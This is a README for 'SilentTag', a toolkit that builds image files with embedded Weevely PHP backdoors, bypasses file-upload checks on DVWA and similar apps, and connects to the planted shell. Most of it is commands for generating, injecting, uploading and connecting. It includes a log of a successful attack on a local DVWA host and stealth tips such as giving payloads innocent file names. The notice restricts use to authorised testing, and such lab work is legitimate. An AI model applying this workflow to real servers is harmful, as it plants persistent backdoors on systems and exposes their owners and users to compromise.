# 🛡️ SilentTag
### Professional Polyglot File Generator & Upload Exploitation Suite

**Developed by Alinaswe Simfukwe**

Complete toolkit for DVWA file upload vulnerability exploitation with Weevely backdoors.  
Features professional GUI and CLI tools for polyglot file generation.

## 🎯 What's in This Toolkit

### 1. **Shell Injector Tools** ⭐ NEW!

#### 🌟 GUI Version - Professional Edition (Recommended)
```bash
python3 silenttag_gui.py
```
**Beautiful Professional Interface:**
- 🎨 Modern dark theme with cyan accents
- 🖱️ Intuitive point-and-click interface
- 📁 Visual file selection dialogs
- 🔧 Built-in Weevely generator with password input
- 📊 Real-time colored console output
- ✅ One-click sample image creator
- 🚀 Large action button, hard to miss
- 💡 Smart file path suggestions
- ⚡ Non-blocking operations with threading
- 🎯 Professional emoji-enhanced messages

**See:** `GUI_README.md` and `GUI_GUIDE.md` for complete documentation

#### CLI Version (Advanced Users)
```bash
python3 silenttag_cli.py image.jpg backdoor.php -o malicious.jpg
```
- 💻 Command-line interface
- 🤖 Scriptable and automatable
- 🔄 Batch processing support
- 3️⃣ Three injection methods

**See:** `INJECTOR_USAGE.md` and `QUICK_REFERENCE.txt`

### 2. Upload Exploitation Scripts

- `upload_bypass.py` - Automated multi-method upload bypass
- `upload_exploit.py` - Basic DVWA uploader
- `create_payloads.sh` - Generate multiple bypass payloads

### 3. Utilities

- `fix_weevely.sh` - Fix Weevely for Python 3.13+
- `test_shell.py` - Test backdoor connectivity
- `demo_injector.sh` - Interactive demonstration

## 🚀 Quick Start

### Option A: Using GUI (Easiest)

1. **Launch GUI:**
   ```bash
   python3 silenttag_gui.py
   ```

2. **Click buttons to:**
   - Create sample image
   - Generate Weevely backdoor
   - Select output location
   - Inject and create weaponized file

3. **Upload and connect:**
   ```bash
   # Upload the file manually or via script
   weevely http://target.com/uploads/file.jpg password
   ```

### Option B: Using CLI

1. **Generate backdoor:**
   ```bash
   weevely generate mypassword backdoor.php
   ```

2. **Create weaponized image:**
   ```bash
   python3 silenttag_cli.py --create-sample photo.jpg
   python3 silenttag_cli.py photo.jpg backdoor.php -o evil.jpg
   ```

3. **Upload and connect:**
   ```bash
   # Use upload script or manual upload
   weevely http://target.com/uploads/evil.jpg mypassword
   ```

## 📚 Documentation Files

| File | Description |
|------|-------------|
| `GUI_README.md` | ⭐ Professional GUI documentation & features |
| `GUI_GUIDE.md` | Complete GUI tutorial with step-by-step workflows |
| `INJECTOR_USAGE.md` | Detailed CLI documentation with examples |
| `QUICK_REFERENCE.txt` | Command cheat sheet for quick reference |
| `README.md` | This overview file |

## 🎓 Complete DVWA Attack Example

```bash
# 1. Fix Weevely (if needed)
./fix_weevely.sh

# 2. Use GUI to create weaponized image
python3 silenttag_gui.py
# - Create sample: test.gif
# - Generate Weevely: password "dvwa123"
# - Output: payload.gif
# - Click inject

# 3. Upload to DVWA
python3 upload_bypass.py  # (already configured for DVWA)

# 4. Connect
weevely http://192.168.43.106/dvwa/hackable/uploads/payload.gif dvwa123
```

## 🛠️ Tool Comparison

### When to Use GUI
- ✅ You're new to shell injection
- ✅ Want visual feedback
- ✅ Need one-off exploitation
- ✅ Prefer point-and-click

### When to Use CLI
- ✅ Batch processing multiple files
- ✅ Automation/scripting
- ✅ Integration with other tools
- ✅ Headless environments

## 📦 Files Overview

```
web pentest/
├── 🌟 MAIN TOOLS
│   ├── silenttag_gui.py           ⭐ GUI Professional Edition
│   ├── silenttag_cli.py           💻 CLI Advanced Version
│   └── launch_gui.sh              🚀 GUI Launcher Script
│
├── 📖 DOCUMENTATION  
│   ├── GUI_README.md              ⭐ GUI features & design docs
│   ├── GUI_GUIDE.md               📘 GUI step-by-step tutorial
│   ├── INJECTOR_USAGE.md          📘 CLI detailed guide
│   ├── QUICK_REFERENCE.txt        📄 Quick command reference
│   └── README.md                  📚 Main overview (this file)
│
├── 🔧 UTILITIES
│   ├── upload_bypass.py           🔓 DVWA auto upload tool
│   ├── fix_weevely.sh            🔧 Python 3.13 compatibility fix
│   ├── create_payloads.sh        🎯 Bypass payload generator
│   ├── demo_injector.sh          🎬 Interactive demo
│   └── test_shell.py             ✅ Backdoor connectivity tester
│
└── 📁 GENERATED FILES
    ├── backdoor.php / backdoor.gif (Weevely shells)
    ├── sample images (test files)
    └── weaponized outputs (polyglot files)
```

## 🎯 Successful Attack Log

### DVWA File Upload Exploitation ✓

**Target:** `http://192.168.43.106/dvwa/vulnerabilities/upload/`

**Method:** GIF header bypass
- Created: `backdoor.gif` (Weevely shell with GIF89a header)
- Uploaded: Successfully bypassed image validation
- Location: `http://192.168.43.106/dvwa/hackable/uploads/backdoor.gif`
- Status: ✅ VERIFIED WORKING

**Connection:**
```bash
weevely http://192.168.43.106/dvwa/hackable/uploads/backdoor.gif mypassword
```

## 🔧 Troubleshooting

### Weevely telnetlib Error
```bash
./fix_weevely.sh
```

### GUI Won't Launch
```bash
sudo apt install python3-tk
```

### Upload Rejected
- Try GIF format (most permissive)
- Use real image instead of generated
- Try different injection method

## 💡 Tips

1. **GIF format** works best for bypasses
2. **Real images** are stealthier than generated ones
3. **Test locally** before uploading to targets
4. **Keep passwords simple** but secure
5. **Name files innocently** (e.g., "vacation.jpg")

## ⚠️ Legal Notice

This toolkit is for **authorized penetration testing only**.

- Only use on systems you own or have written permission to test
- Understand legal implications in your jurisdiction
- Educational purposes and security research

## 🆘 Support

**GUI Issues:** See `GUI_GUIDE.md`  
**CLI Issues:** See `INJECTOR_USAGE.md`  
**Quick Reference:** See `QUICK_REFERENCE.txt`

---

**Created:** November 2025  
**Tools:** CLI + GUI Shell Injectors, Weevely Integration  
**Target:** DVWA & Similar Web Applications
